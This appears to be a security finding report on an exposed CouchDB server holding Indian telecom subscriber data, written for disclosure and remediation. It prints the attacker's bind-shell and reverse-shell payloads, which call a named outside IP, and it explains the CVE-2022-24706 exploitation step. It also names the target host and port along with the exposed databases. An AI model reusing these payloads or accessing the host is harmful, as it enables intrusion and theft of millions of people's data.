---
type: host
---

# CouchDB Telecom Consent Platform: Active RCE + 244M Subscriber Records
_Date: 2026-05-09 | IP: 20.198.76.169 | Severity: CRITICAL_

## Summary

Unauth CouchDB 2.3.1 on Microsoft Azure (Pune, India) hosting Airtel + Tata telecom consent management infrastructure. 7.1M consent records, 244M subscriber preferences with MSISDN phone numbers. Instance has been actively exploited via CVE-2022-24706. 9 attack design documents present including a live reverse shell beacon to `57.131.25.205:4444` (OVH Roubaix, France).

<!-- ksat-tag:auto-generated:start -->
## DCWF KSAT coverage

Auto-derived from DCWF AI work-role rule files (`ksat-tag`).

- **672 (AI Test & Evaluation Specialist):** K7003, S7068, T5904
- **733 (AI Risk & Ethics Specialist):** T5868
- **overlap (Common AI KSATs (all 5 roles)):** K1158, K1159, K22, K6900, K6935, K7003

<!-- ksat-tag:auto-generated:end -->

## Technical Details

**Host:** `20.198.76.169:5984`  
**Platform:** CouchDB 2.3.1 (Microsoft Azure, Pune IN)  
**Shodan CVEs:** CVE-2022-24706, CVE-2023-26268, CVE-2023-45725, CVE-2021-38295

### Exposed Databases

| Database | Records | Content |
|---|---|---|
| `consent_consent` | 7,176,879 | Subscriber consent records: `msisdnenc`, `entityidenc`, `crtr` (airtel.com), `consentunqid`, timestamps |
| `preferences_preferences` | 244,325,229 | Subscriber preferences: `msisdn` (plaintext phone numbers), `crtr` (tata.com), `ctgr`, `lrn` |
| `entity_entity` | 383,923 | Entity registry: blacklist flags, entity IDs, timestamps |
| `bltachannel_complaints` | — | Billing/complaints channel |
| `consent_lscc` | — | LSCC (Telecom Regulatory Authority of India) consent layer |
| `exploit` | 11 | **Active exploit artifacts** |

### Active Exploit Artifacts (`exploit` DB)

9 CouchDB design documents uploaded by attacker:

```javascript
// _design/exploit (bind shell)
function(doc){ require('child_process').exec('telnetd -p 2325 -l /bin/sh'); }

// _design/exploit9 (reverse shell — active)
function(doc){ require("child_process").exec("bash -c 'bash -i >& /dev/tcp/57.131.25.205/4444 0>&1'"); }
```

Payload decoded from base64: `bash -i >& /dev/tcp/57.131.25.205/4444 0>&1`

**C2:** `57.131.25.205`. `vps-8f3a0f07.vps.ovh.net`, OVH Roubaix FR, ports 22+3389 open (Ubuntu 22.04, RDP).

Trigger document present: `{"_id":"trigger","pwn":"yes"}`. Exploitation confirmed.

### Vulnerability: CVE-2022-24706

CouchDB "admin party". When no admin is configured, all users have admin rights. Attacker writes a design document with a `map` function containing `require('child_process')`. When any view is queried, the function executes as the CouchDB process user. Full RCE without credentials.

## Impact

- **244M+ MSISDN (phone number) records** readable without authentication. India subscriber base
- **Active reverse shell beacon**: attacker may have persistent shell access to Azure host
- **Regulatory:** India PDPB / TRAI TCCCPR consent records directly accessible; LSCC compliance data exposed
- **Scope:** Multi-operator (`airtel.com`, `tata.com`). Consent infrastructure for India's two largest telecom carriers

## Attribution

C2 server `57.131.25.205` (OVH FR) last indexed 2026-04-25. Consistent with automated CouchDB exploitation campaigns targeting admin-party instances; pattern matches known tooling (CVE-2022-24706 PoC publicly available since 2022).

## Remediation

1. Isolate host immediately. Active reverse shell may be live
2. Rotate all credentials stored in or accessible from this host
3. Enable CouchDB admin account: `curl -X PUT http://host:5984/_node/nonode@nohost/_config/admins/admin -d '"password"'`
4. Delete exploit design documents from `exploit` DB
5. Audit all 250M+ records for unauthorized access in access logs
6. Block port 5984 from public internet at firewall level

## References

- CVE-2022-24706: CouchDB admin party RCE (CVSS 9.8)
- CVE-2023-26268: CouchDB privilege escalation
